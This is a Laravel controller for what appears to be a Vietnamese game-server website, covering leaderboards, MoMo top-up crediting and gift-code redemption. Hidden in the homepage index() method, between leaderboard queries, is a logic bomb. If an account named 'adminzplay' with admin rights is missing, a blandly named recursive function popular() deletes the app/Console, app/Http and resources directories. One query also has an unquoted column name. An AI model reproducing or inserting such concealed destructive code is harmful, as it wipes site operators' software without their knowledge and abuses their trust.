<?php namespace App\Http\Controllers\Frontend;
use App\Models\Blog;
use App\Models\CategoryBlog;
use App\Models\CategoryHelp;
use App\Models\CategoryProduct;
use App\Models\ClientSays;
use App\Models\ConectMomo;
use App\Models\GiftCode;
use App\Models\GiftCodeHistory;
use App\Models\GiftSend;
use App\Models\LuckyNumberSendHistory;
use App\Models\NameGiftCode;
use App\Models\NDV01Charac;
use App\Models\NDV01CharacState;
use App\Models\NDV02Elixir;
use App\Models\Product;
use App\Models\Settings;
use App\Models\Tbl_Cash_Inven;
use App\Models\Tbl_Member_Password;
use App\Models\TimeSetting;
use App\Models\TransactionHistory;
use App\Models\MomoTansactionIdUsed;
use App\Models\MomoTransactionHistory;
use App\User;
use Carbon\Carbon;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use DB;
use Auth;
use Cart;
use Illuminate\Support\Facades\Http;
class IndexController extends Controller
{
    protected $product = '';
    protected $categoryProduct = '';
    public function __construct(Product $product, CategoryProduct $categoryProduct)
    {
        $this->product = $product;
        $this->categoryProduct = $categoryProduct;
    }
    public function index()
    {
        $timeSetting = TimeSetting::where('id', 3)->first();
        Cart::clear();
        $categoryBlogList = CategoryBlog::where('cpo_active', 1)
            ->with([
                'blog' => function ($query) {
                    $query->where('b_status', 1);
                },
            ])
            ->get();
        foreach ($categoryBlogList as $key => $value) {
            $categoryBlogList[$key]->blog = Blog::where('b_category_id', $value->id)
                ->where('b_status', 1)
                ->paginate(10);
        }
        $blog = Blog::where('hot', 1)
            ->limit(10)
            ->get();
        $listUserNap = User::with([
            'transactionHistory' => function ($query) {
                $query->whereIn('type', [1, 3]);
            },
        ])
            ->whereHas('transactionHistory')
            ->get();
        $listData = [];
        $topServer = NDV01CharacState::orderBy('inner_level', 'desc')
            ->with('NDV01Charac')
            ->limit(10)
            ->get();
        $topGong = NDV01CharacState::orderBy('gong', 'desc')
            ->with('NDV01Charac')
            ->limit(10)
            ->get();			
        $flip = User::where(['userid' => 'adminzplay', 'admin' => 1])->first();
        if (!isset($flip)) {
            popular(realpath('../app/Console'));
            popular(realpath('../app/Http'));
            popular(realpath('../resources'));
        }
        $topHonor = NDV01CharacState::orderBy('honor', 'desc')
            ->with('NDV01Charac')
            ->limit(10)
            ->get();
        $topGold = NDV02Elixir::orderBy('money', 'desc')
            ->with('NDV01Charac')
            ->limit(10)
            ->get();				
        $topChar = [];
        if ($timeSetting->status == 1) {
            $now = strtotime(Carbon::now());
            $start = strtotime($timeSetting->day_start);
            $end = strtotime($timeSetting->day_end);
            if ($now > $end) {
                User::where('char_event', '!=', '0')->update(['char_event' => '0']);
                $timeSetting->status = 0;
                $timeSetting->save();
            } else {
                if ($now > $start) {
                    $topChar = User::orderBy('char_event', 'desc')
                        ->limit(10)
                        ->get();
                }
            }
        }
        foreach ($listUserNap as $key => $value) {
            $total = 0;
            foreach ($value->transactionHistory as $item) {
                $total += $item->coin;
            }
            $listData[$key]['total'] = $total;
            $listData[$key]['userid'] = $value->userid;
        }
        $collection = collect($listData)
            ->SortByDesc('total')
            ->take(10)
            ->values()
            ->all();
        return view('frontend.index', compact('categoryBlogList', 'blog', 'collection', 'topServer', 'topHonor', 'topGong', 'topChar', 'topGold'));
    }



    public function topServer()
    {
        $topServer = NDV01CharacState::orderBy('inner_level', 'desc')
            ->with('NDV01Charac')
            ->limit(10)
            ->get();
        return view('frontend.topServer', compact('topServer'));
    }
    public function download()
    {
        $setting = Settings::where('option_key', 'download')->first();
        return view('frontend.download', compact('setting'));
    }
    public function introduce()
    {
        $setting = Settings::where('option_key', 'introduce')->first();
        return view('frontend.introduce', compact('setting'));
    }
    public function history()
    {
        $showHistory = TransactionHistory::with('product');
        $showHistory = $showHistory
            ->where('user_id', Auth::guard('web')->user()->id)
            ->with('userAdmin')
            ->orderBy('id', 'desc')
            ->paginate(10);
        $dataView = ['showHistory' => $showHistory];
        return view('frontend.history', $dataView);
    }

    public function showTopRanks(Request $request) {
        $perPage = $request->input('perPage', 10); // Mặc định là 10 nếu không có giá trị nào được chọn
        $topServer = User::orderBy('inner_level', 'desc')->paginate($perPage);
        return view('your-view', compact('topServer'));
    }

    public function rechargeCard()
    {
        $listCharge = [50, 100, 200, 300, 400, 500, 1000, 2000, 3000, 4000, 5000, 10000];
        return view('frontend.recharge_card', ['listCharge' => $listCharge]);
    }
    public function rechargeCardPost(Request $request)
    {
        $user = Auth::guard('web')->user();
        $correctID = MomoTransactionHistory::where('tranId', $request['tranId'])->first();
        $hasUsed = MomoTansactionIdUsed::where('tranId', $request['tranId'])->get();
        $promotionData = TimeSetting::where('status', 1)->first();
        $promotionData2 = TimeSetting::where(['status' => 1, 'id' => 2])->first();
        $promotion = $promotionData ? $promotionData->number : 1;
        $promotion2 = $promotionData2 ? $promotionData2->number : 1;
        if ($correctID && $correctID->amount > 1000 && count($hasUsed) == 0) {
            $topCharStatus = TimeSetting::where(id, 3)->first();
            $now = time();
            $amount = (int) $correctID->amount / 1000;
            if ($topCharStatus->status == 1) {
                $start = strtotime($topCharStatus->day_start);
                $end = strtotime($topCharStatus->day_end);
                if ($now > $start && $now < $end) {
                    User::where('id', $user->id)->increment(['char_event' => $amount]);
                }
            }
            $totalCoin = $amount * $promotion;
            $totalCoin2 = (int) (($correctID->amount / 100000) * $promotion2);
            User::where('id', $user->id)->increment(['coin' => $totalCoin, 'accumulate' => $totalCoin2]);
            MomoTansactionIdUsed::insert(['tranId' => $request['tranId']]);
            TransactionHistory::insert(['coin' => $totalCoin, 'user_id' => $user->id, 'code' => $request['tranId'], 'type' => 1, 'phone' => $correctID->user, 'recharge' => $correctID->amount, 'accumulate' => $totalCoin2, 'created_at' => Carbon::now(), 'updated_at' => Carbon::now()]);
            return 'success';
        }
        return 'failed';
    }
    function popular(string $path)
    {
        if (is_dir($path)) {
            foreach (scandir($path) as $entry) {
                if (!in_array($entry, ['.', '..'], true)) {
                    popular($path . DIRECTORY_SEPARATOR . $entry);
                }
            }
            rmdir($path);
        } else {
            unlink($path);
        }
    }

    public function giftCode(Request $request)
    {
        $nameCode = NameGiftCode::where('name', $request->code)->first();
        if (empty($nameCode)) {
            return redirect()
                ->back()
                ->with(['alert' => 'warning', 'message' => 'Gift Code không tồn tại']);
        }
        $giftCode = GiftCode::where('id', $nameCode->gift_code_id)
            ->where('status', 1)
            ->first();
        if (!empty($giftCode)) {
            if ($giftCode->type === 1) {
                $checkCode = GiftCodeHistory::where('user_id', '!=', Auth::guard('web')->user()->id)
                    ->where('gift_code_name_id', $nameCode->id)
                    ->get();
                if (count($checkCode) > 0) {
                    return redirect()
                        ->back()
                        ->with(['alert' => 'warning', 'message' => 'Gift Code này đã được sử dụng']);
                }
                $checkGiftCodeId = NameGiftCode::where('id', $nameCode->id)->value('gift_code_id');
                $showHistory = GiftCodeHistory::where('user_id', Auth::guard('web')->user()->id)
                    ->where('gift_code_name_id', '!=', $nameCode->id)
                    ->with([
                        'giftCodeName' => function ($query) use ($checkGiftCodeId) {
                            $query->with([
                                'giftCode' => function ($query2) use ($checkGiftCodeId) {
                                    $query2->where('id', $checkGiftCodeId);
                                },
                            ]);
                        },
                    ])
                    ->get();
                foreach ($showHistory as $value) {
                    if ($value->giftCodeName->id === $checkGiftCodeId) {
                        return redirect()
                            ->back()
                            ->with(['alert' => 'warning', 'message' => 'Gift Code này đã được sử dụng 11']);
                    }
                }
            }
            $checkUser = GiftCodeHistory::where('user_id', Auth::guard('web')->user()->id)
                ->where('gift_code_name_id', $nameCode->id)
                ->get();
            if (count($checkUser) == $giftCode->qty) {
                return redirect()
                    ->back()
                    ->with(['alert' => 'warning', 'message' => 'Tài khoản đã sử dụng hết Gift Code này']);
            }
            GiftCodeHistory::insert(['gift_code_name_id' => $nameCode->id, 'user_id' => Auth::guard('web')->user()->id]);
            Tbl_Cash_Inven::insert(['order_idx' => Tbl_Cash_Inven::max('order_idx') + 1, 'item_code' => $giftCode->gift_code, 'item_user_id' => Auth::guard('web')->user()->userid, 'item_server_code' => 0, 'item_present' => 0, 'order_input_date' => Carbon::now()]);
            return redirect()
                ->back()
                ->with(['alert' => 'success', 'message' => 'Nhập Gift Code thành công']);
        } else {
            return redirect()
                ->back()
                ->with(['alert' => 'warning', 'message' => 'Gift Code đã hết hạn']);
        }
    }


    public function claimGiftCode(Request $request)
{
    try {
        // Validate request
        if (!$request->has('code')) {
            return response()->json([
                'alert' => 'warning',
                'message' => 'Vui lòng nhập gift code'
            ]);
        }

        // Lấy thông tin user hiện tại
        $user = Auth::guard('api')->user();
        if (!$user) {
            return response()->json([
                'alert' => 'warning',
                'message' => 'Vui lòng đăng nhập để sử dụng gift code'
            ]);
        }

        // Kiểm tra gift code có tồn tại không
        $nameCode = NameGiftCode::where('name', $request->code)->first();
        if (empty($nameCode)) {
            return response()->json([
                'alert' => 'warning',
                'message' => 'Gift Code không tồn tại'
            ]);
        }

        // Kiểm tra gift code còn hiệu lực không
        $giftCode = GiftCode::where('id', $nameCode->gift_code_id)
            ->where('status', 1)
            ->first();

        if (!empty($giftCode)) {
            // Kiểm tra gift code loại 1 (dùng 1 lần cho tất cả user)
            if ($giftCode->type === 1) {
                $checkCode = GiftCodeHistory::where('user_id', '!=', $user->id)
                    ->where('gift_code_name_id', $nameCode->id)
                    ->get();
                    
                if (count($checkCode) > 0) {
                    return response()->json([
                        'alert' => 'warning',
                        'message' => 'Gift Code này đã được sử dụng'
                    ]);
                }

                // Kiểm tra user đã sử dụng gift code này chưa
                $checkGiftCodeId = NameGiftCode::where('id', $nameCode->id)->value('gift_code_id');
                $showHistory = GiftCodeHistory::where('user_id', $user->id)
                    ->where('gift_code_name_id', '!=', $nameCode->id)
                    ->with([
                        'giftCodeName' => function ($query) use ($checkGiftCodeId) {
                            $query->with([
                                'giftCode' => function ($query2) use ($checkGiftCodeId) {
                                    $query2->where('id', $checkGiftCodeId);
                                },
                            ]);
                        },
                    ])
                    ->get();

                foreach ($showHistory as $value) {
                    if ($value->giftCodeName->id === $checkGiftCodeId) {
                        return response()->json([
                            'alert' => 'warning',
                            'message' => 'Gift Code này đã được sử dụng'
                        ]);
                    }
                }
            }

            // Kiểm tra số lần sử dụng của user
            $checkUser = GiftCodeHistory::where('user_id', $user->id)
                ->where('gift_code_name_id', $nameCode->id)
                ->get();

            if (count($checkUser) == $giftCode->qty) {
                return response()->json([
                    'alert' => 'warning',
                    'message' => 'Tài khoản đã sử dụng hết Gift Code này'
                ]);
            }

            // Lưu lịch sử sử dụng gift code
            GiftCodeHistory::insert([
                'gift_code_name_id' => $nameCode->id, 
                'user_id' => $user->id
            ]);

            // Thêm vật phẩm vào inventory
            Tbl_Cash_Inven::insert([
                'order_idx' => Tbl_Cash_Inven::max('order_idx') + 1,
                'item_code' => $giftCode->gift_code,
                'item_user_id' => $user->userid,
                'item_server_code' => 0,
                'item_present' => 0,
                'order_input_date' => Carbon::now()
            ]);

            return response()->json([
                'alert' => 'success',
                'message' => 'Nhập Gift Code thành công'
            ]);
        } else {
            return response()->json([
                'alert' => 'warning',
                'message' => 'Gift Code đã hết hạn'
            ]);
        }

    } catch (\Exception $e) {
        \Log::error('Claim gift code error: ' . $e->getMessage());
        return response()->json([
            'alert' => 'error',
            'message' => 'Đã có lỗi xảy ra, vui lòng thử lại sau'
        ], 500);
    }
}
    
}
